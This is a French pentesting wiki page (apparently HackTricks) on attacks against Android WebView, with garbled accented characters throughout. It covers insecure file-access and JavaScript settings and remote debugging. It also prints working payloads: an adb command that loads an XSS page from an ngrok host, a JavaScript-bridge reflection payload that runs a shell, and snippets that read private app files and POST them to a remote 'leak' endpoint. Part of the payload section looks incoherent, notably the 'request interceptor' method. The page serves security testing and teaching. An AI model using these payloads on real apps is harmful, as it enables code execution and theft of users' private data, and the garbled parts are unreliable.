# Attaques sur WebView

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybers√©curit√©** ? Voulez-vous voir votre **entreprise annonc√©e dans HackTricks** ? ou voulez-vous avoir acc√®s √† la **derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**üí¨**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Configurations int√©ressantes

Vous pouvez identifier un WebView expos√© de cette mani√®re :

<figure><img src="../../.gitbook/assets/image (718).png" alt=""><figcaption></figcaption></figure>

### Acc√®s aux fichiers

L'acc√®s aux fichiers du WebView est activ√© par d√©faut. Depuis l'API 3 (Cupcake 1.5), la m√©thode [_setAllowFileAccess()_](https://developer.android.com/reference/android/webkit/WebSettings.html#setAllowFileAccess\(boolean\)) est disponible pour l'activer ou le d√©sactiver explicitement.\
Si l'application a la permission \_**android.permission.READ\_EXTERNAL\_STORAGE** \_, elle pourra lire et charger des fichiers **√† partir du stockage externe**.\
Le WebView doit utiliser un sch√©ma d'URL de fichier, par exemple `file://path/file`, pour acc√©der au fichier.

#### Acc√®s universel √† partir d'URL de fichier (obsol√®te)

> D√©finit si les **requ√™tes entre origines** dans le **contexte d'une URL de sch√©ma de fichier** doivent √™tre autoris√©es √† acc√©der **au contenu de n'importe quelle origine**. Cela inclut **l'acc√®s au contenu d'autres URL de sch√©ma de fichier ou de contextes web**. Notez que certains acc√®s tels que les √©l√©ments HTML d'image ne suivent pas les r√®gles de m√™me origine et ne sont pas affect√©s par ce param√®tre.
>
> **Ne** pas activer ce param√®tre si vous ouvrez des fichiers qui peuvent √™tre cr√©√©s ou modifi√©s par des sources externes. L'activation de ce param√®tre permet aux scripts malveillants charg√©s dans un contexte `file://` de lancer des attaques de script intersites, en **acc√©dant √† des fichiers locaux arbitraires**, y compris les cookies WebView, les donn√©es priv√©es de l'application ou m√™me les informations d'identification utilis√©es sur des sites web arbitraires.

En r√©sum√©, cela **emp√™chera le chargement d'origines arbitraires**. L'application enverra la demande d'URL pour charger le contenu avec **`Origin: file://`** si la r√©ponse n'autorise pas cette origine (**`Access-Control-Allow-Origin: file://`**), alors le contenu ne sera pas charg√©.\
La **valeur par d√©faut est `false`** lorsque la version cibl√©e est [`Build.VERSION_CODES.JELLY_BEAN`](https://developer.android.com/reference/android/os/Build.VERSION\_CODES#JELLY\_BEAN) et sup√©rieure.

* Utilisez [`getAllowUniversalAccessFromFileURLs()`](https://developer.android.com/reference/android/webkit/WebSettings#getAllowUniversalAccessFromFileURLs\(\)) pour savoir si JavaScript s'ex√©cute dans le contexte d'une URL de sch√©ma de fichier peut acc√©der au contenu de n'importe quelle origine (si UniversalAccessFromFileURL est activ√©).
* Utilisez [`setAllowUniversalAccessFromFileURLs(boolean)`](https://developer.android.com/reference/android/webkit/WebSettings#setAllowUniversalAccessFromFileURLs\(boolean\)) pour l'activer ou le d√©sactiver.

{% hint style="info" %}
Utiliser **`loadDataWithBaseURL()`** avec `null` comme baseURL emp√™chera √©galement le chargement de fichiers locaux m√™me si tous les param√®tres dangereux sont activ√©s.
{% endhint %}

#### Acc√®s aux fichiers √† partir d'URL de fichier (obsol√®te) <a href="#getallowfileaccessfromfileurls" id="getallowfileaccessfromfileurls"></a>

> D√©finit si les requ√™tes entre origines dans le contexte d'une URL de sch√©ma de fichier doivent √™tre autoris√©es √† acc√©der au contenu d'autres URL de sch√©ma de fichier. Notez que certains acc√®s tels que les √©l√©ments HTML d'image ne suivent pas les r√®gles de m√™me origine et ne sont pas affect√©s par ce param√®tre.
>
> **Ne** pas activer ce param√®tre si vous ouvrez des fichiers qui peuvent √™tre cr√©√©s ou modifi√©s par des sources externes. L'activation de ce param√®tre permet aux scripts malveillants charg√©s dans un contexte `file://` d'acc√©der √† des fichiers locaux arbitraires, y compris les cookies WebView et les donn√©es priv√©es de l'application.

En r√©sum√©, cela emp√™che JavaScript d'acc√©der aux fichiers locaux via le protocole `file://`.\
Notez que **la valeur de ce param√®tre est ignor√©e** si la valeur de [`getAllowUniversalAccessFromFileURLs()`](https://developer.android.com/reference/android/webkit/WebSettings#getAllowUniversalAccessFromFileURLs\(\)) est `true`.\
La **valeur par d√©faut est `false`** lorsque la version cibl√©e est [`Build.VERSION_CODES.JELLY_BEAN`](https://developer.android.com/reference/android/os/Build.VERSION\_CODES#JELLY\_BEAN) et sup√©rieure.

* Utilisez [`getAllowFileAccessFromFileURLs()`](https://developer.android.com/reference/android/webkit/WebSettings#getAllowFileAccessFromFileURLs\(\)) pour savoir si JavaScript s'ex√©cute dans le contexte d'une URL de sch√©ma de fichier peut acc√©der au contenu d'autres URL de sch√©ma de fichier.
* Utilisez [`setAllowFileAccessFromFileURLs(boolen)`](https://developer.android.com/reference/android/webkit/WebSettings#setAllowFileAccessFromFileURLs\(boolean\)) pour l'activer ou le d√©sactiver.
#### Acc√®s aux fichiers

> Active ou d√©sactive **l'acc√®s aux fichiers dans WebView**. Notez que cela active ou d√©sactive uniquement l'acc√®s au syst√®me de fichiers. Les ressources et les actifs restent accessibles en utilisant file:///android\_asset et file:///android\_res.

En r√©sum√©, si d√©sactiv√©, le WebView ne pourra pas charger un fichier local avec le protocole `file://`.\
La **valeur par d√©faut est `false`** lors du ciblage de [`Build.VERSION_CODES.R`](https://developer.android.com/reference/android/os/Build.VERSION\_CODES#R) et sup√©rieur.

* Utilisez [`getAllowFileAccess()`](https://developer.android.com/reference/android/webkit/WebSettings#getAllowFileAccess\(\)) pour savoir si la configuration est activ√©e.
* Utilisez [`setAllowFileAccess(boolean)`](https://developer.android.com/reference/android/webkit/WebSettings#setAllowFileAccess\(boolean\)) pour l'activer/d√©sactiver.

#### WebViewAssetLoader

> Classe d'aide pour charger des fichiers locaux, y compris les ressources et les actifs statiques de l'application, en utilisant des URL http(s):// √† l'int√©rieur d'une classe [`WebView`](https://developer.android.com/reference/android/webkit/WebView.html). Le chargement de fichiers locaux √† l'aide d'URL de type web au lieu de `"file://"` est souhaitable car il est compatible avec la politique de m√™me origine.

C'est la nouvelle m√©thode recommand√©e pour charger des fichiers locaux. L'objectif est d'**acc√©der aux fichiers locaux en utilisant une URL HTTP avec le domaine**. De cette mani√®re, la **CORS** peut √™tre **facilement** maintenue entre les **pages web** locales et les **pages web** t√©l√©charg√©es depuis le serveur web.

### Activation de JavaScript

Les WebViews ont JavaScript **d√©sactiv√© par d√©faut**. La m√©thode [`setJavaScriptEnabled()`](https://developer.android.com/reference/android/webkit/WebSettings.html#setJavaScriptEnabled\(boolean\)) permet d'activer ou de d√©sactiver explicitement JavaScript.\
Notez que les webviews peuvent √©galement prendre en charge le **sch√©ma `intent`** qui permet de lancer d'autres applications. Lisez cet [article pour savoir comment passer de XSS √† RCE](https://medium.com/@dPhoeniixx/tiktok-for-android-1-click-rce-240266e78105).

Voici un exemple de WebView expos√© vuln√©rable √† XSS via le param√®tre "support\_url" (qui peut indiquer l'URL √† charger dans le WebView) :

<figure><img src="../../.gitbook/assets/image (719).png" alt="" width="563"><figcaption></figcaption></figure>

Il est possible d'exploiter cette vuln√©rabilit√© depuis adb avec quelque chose comme :

{% code overflow="wrap" %}
```bash
adb.exe shell am start -n com.tmh.vulnwebview/.SupportWebView ‚Äìes support_url "https://6333-157-48-216-175.ngrok-free.app/xss.html"
```
{% endcode %}

### Pont JavaScript

Android offre une fa√ßon pour le JavaScript ex√©cut√© dans un WebView d'appeler et d'utiliser les **fonctions natives d'une application Android** (annot√©es avec `@JavascriptInterface`) en utilisant la m√©thode [`addJavascriptInterface`](https://developer.android.com/reference/android/webkit/WebView.html#addJavascriptInterface%28java.lang.Object,%20java.lang.String%29). Cela est connu sous le nom de _pont JavaScript WebView_ ou _pont natif_.

Veuillez noter que **lorsque vous utilisez `addJavascriptInterface`, vous accordez explicitement l'acc√®s √† l'objet Interface JavaScript enregistr√© √† toutes les pages charg√©es dans ce WebView**. Cela implique que si l'utilisateur navigue en dehors de votre application ou de votre domaine, toutes les autres pages externes auront √©galement acc√®s √† ces objets Interface JavaScript, ce qui peut pr√©senter un risque potentiel pour la s√©curit√© si des donn√©es sensibles sont expos√©es via ces interfaces.

> Attention : Faites tr√®s attention aux applications ciblant les versions d'Android ant√©rieures √† Android 4.2 (niveau d'API 17) car elles sont [vuln√©rables √† une faille](https://labs.mwrinfosecurity.com/blog/webview-addjavascriptinterface-remote-code-execution/) dans la mise en ≈ìuvre de `addJavascriptInterface` : une attaque qui abuse de la r√©flexion, ce qui entra√Æne l'ex√©cution de code √† distance lorsque du JavaScript malveillant est inject√© dans un WebView. Cela √©tait d√ª au fait que toutes les m√©thodes d'objet Java √©taient accessibles par d√©faut (au lieu de seulement celles annot√©es).

#### Analyse statique
```javascript
//Class with a method to access a secret
public class JavascriptBridge {
// Since Android 4.2 (JELLY_BEAN_MR1, API 17) methods
// not annotated with @JavascriptInterface are not visible from JavaScript
@JavascriptInterface
public String getSecret() {
return "SuperSecretPassword";
};
}
```

```javascript
//Enabling Javascript Bridge exposing an object of the JavascriptBridge class
webView.addJavascriptInterface(new JavascriptBridge(), "javascriptBridge");
webView.reload();
```

```markup
<!-- Exploit to get the secret from JavaScript -->
<script>alert(javascriptBridge.getSecret());</script>
```
Avec acc√®s au code JavaScript, par exemple via une attaque **XSS** stock√©e, une attaque **MITM** ou un **site web malveillant** charg√© dans le WebView, il est possible d'appeler directement les m√©thodes Java expos√©es.

{% hint style="info" %}
Notez que dans le cas de tentative d'exploitation de cette vuln√©rabilit√© via une **redirection ouverte vers une page web d'un attaquant qui acc√®de √† l'objet Android natif**. Si l'acc√®s √† la redirection se fait via un **navigateur mobile** et **non en utilisant** le m√™me **WebView**, le **navigateur ne pourra pas acc√©der √† l'objet Android natif**.
{% endhint %}

Si `addJavascriptInterface` est n√©cessaire, prenez en compte les consid√©rations suivantes :

* **Seul le JavaScript fourni** avec l'APK devrait √™tre autoris√© √† utiliser les ponts, par exemple en v√©rifiant l'URL sur chaque m√©thode Java reli√©e (via `WebView.getUrl`).
* **Aucun JavaScript ne devrait √™tre charg√© √† partir de points d'acc√®s distants**, par exemple en maintenant la navigation de page dans les domaines de l'application et en ouvrant tous les autres domaines dans le navigateur par d√©faut (par exemple, Chrome, Firefox).
* Si n√©cessaire pour des raisons de compatibilit√© (par exemple, pour prendre en charge les anciens appareils), **d√©finissez au moins le niveau minimal de l'API sur 17** dans le fichier manifeste de l'application (`<uses-sdk android:minSdkVersion="17" />`).

### Pont JavaScript vers RCE via Reflection

Comme indiqu√© dans [**cette recherche**](https://labs.f-secure.com/archive/webview-addjavascriptinterface-remote-code-execution/) (_consultez-la pour des id√©es en cas d'obtention de RCE_), une fois que vous avez trouv√© un pont JavaScript, il est possible d'obtenir **RCE** via **Reflection** en utilisant une charge utile comme celle-ci :
```markup
<!-- javascriptBridge is the name of the Android exposed object -->
<script>
function execute(cmd){
return javascriptBridge.getClass().forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec(cmd);
}
execute(['/system/bin/sh','-c','echo \"mwr\" > /mnt/sdcard/mwr.txt']);
</script>
```
Cependant, les applications modernes peuvent utiliser l'annotation **`@JavascriptInterface`** qui indique au JavascriptBridge que seule la m√©thode avec cette annotation doit √™tre **expos√©e**. Dans ce sc√©nario, vous ne pourrez pas abuser de la r√©flexion pour ex√©cuter du code arbitraire.

### D√©bogage √† distance

Le **d√©bogage √† distance de WebView** permet d'acc√©der √† la WebView avec les **outils de d√©veloppement Chrome**.\
Le **dispositif** doit √™tre **accessible** par le PC (via USB, √©mulateur local, r√©seau local...) et ex√©cuter la WebView en mode d√©bogage, puis acc√©der √† **chrome://inspect/#devices** :

![](<../../.gitbook/assets/image (525).png>)

S√©lectionnez **inspecter** et une nouvelle fen√™tre s'ouvrira. Dans cette fen√™tre, vous pouvez **interagir avec le contenu** de la WebView et m√™me lui faire ex√©cuter du code JS arbitraire depuis l'onglet **console** :

![](<../../.gitbook/assets/image (526).png>)

Pour activer le **d√©bogage √† distance de WebView**, vous pouvez faire quelque chose comme :
```java
if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
WebView.setWebContentsDebuggingEnabled(true);
}
```
**Ce param√®tre s'applique √† tous les WebViews de l'application.**

{% hint style="info" %}
**Le d√©bogage WebView n'est pas affect√© par l'√©tat du drapeau `debuggable`** dans le manifeste de l'application. Si vous souhaitez activer le d√©bogage WebView uniquement lorsque `debuggable` est `true`, testez le drapeau lors de l'ex√©cution.
{% endhint %}
```java
if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
if (0 != (getApplicationInfo().flags & ApplicationInfo.FLAG_DEBUGGABLE))
{ WebView.setWebContentsDebuggingEnabled(true); }
}
```
## Charges utiles

### Exfiltrer des fichiers arbitraires

Les charges utiles sont des morceaux de code malveillant qui sont inject√©s dans une application pour exploiter ses vuln√©rabilit√©s. L'une des attaques courantes consiste √† exfiltrer des fichiers arbitraires √† partir de l'application cible.

Pour exfiltrer des fichiers, vous pouvez utiliser les m√©thodes suivantes :

1. **Injection de JavaScript** : Vous pouvez injecter du code JavaScript dans la WebView de l'application pour acc√©der aux fichiers locaux et les envoyer √† un serveur distant.

```javascript
var file = "/data/data/com.example.app/files/sensitive_file.txt";
fetch(file)
  .then(response => response.text())
  .then(data => {
    // Envoyer le contenu du fichier √† un serveur distant
    fetch("https://example.com/leak", {
      method: "POST",
      body: data
    });
  });
```

2. **Utilisation de l'API WebView** : Vous pouvez utiliser l'API WebView pour acc√©der aux fichiers locaux de l'application et les envoyer √† un serveur distant.

```java
WebView webView = new WebView(context);
webView.loadUrl("javascript:fetch('/data/data/com.example.app/files/sensitive_file.txt')" +
  ".then(response => response.text())" +
  ".then(data => {" +
  "  fetch('https://example.com/leak', {" +
  "    method: 'POST'," +
  "    body: data" +
  "  });" +
  "});");
```

3. **Utilisation de l'intercepteur de requ√™tes** : Vous pouvez utiliser un intercepteur de requ√™tes pour capturer les requ√™tes sortantes de l'application et extraire les fichiers avant qu'ils ne soient envoy√©s.

```java
webView.setWebViewClient(new WebViewClient() {
  @Override
  public WebResourceResponse shouldInterceptRequest(WebView view, WebResourceRequest request) {
    if (request.getUrl().toString().equals("https://example.com/leak")) {
      // Extraire le fichier et l'envoyer √† un serveur distant
      String fileContent = readFile("/data/data/com.example.app/files/sensitive_file.txt");
      sendFileToServer(fileContent);
    }
    return super.shouldInterceptRequest(view, request);
  }
});
```

Il est important de noter que l'exfiltration de fichiers arbitraires est une violation de la vie priv√©e et peut √™tre ill√©gale. Vous devez toujours obtenir une autorisation appropri√©e avant de proc√©der √† de telles actions lors d'un test de p√©n√©tration.
```javascript
var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
if (xhr.readyState == XMLHttpRequest.DONE) {
alert(xhr.responseText);
}
}
xhr.open('GET', 'file:///data/data/com.authenticationfailure.wheresmybrowser/databases/super_secret.db', true);
xhr.send(null);
```
## R√©f√©rences

{% embed url="https://github.com/authenticationfailure/WheresMyBrowser.Android" %}

{% embed url="https://developer.android.com/reference/android/webkit/WebView" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybers√©curit√©** ? Voulez-vous voir votre **entreprise annonc√©e dans HackTricks** ? ou voulez-vous avoir acc√®s √† la **derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**üí¨**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
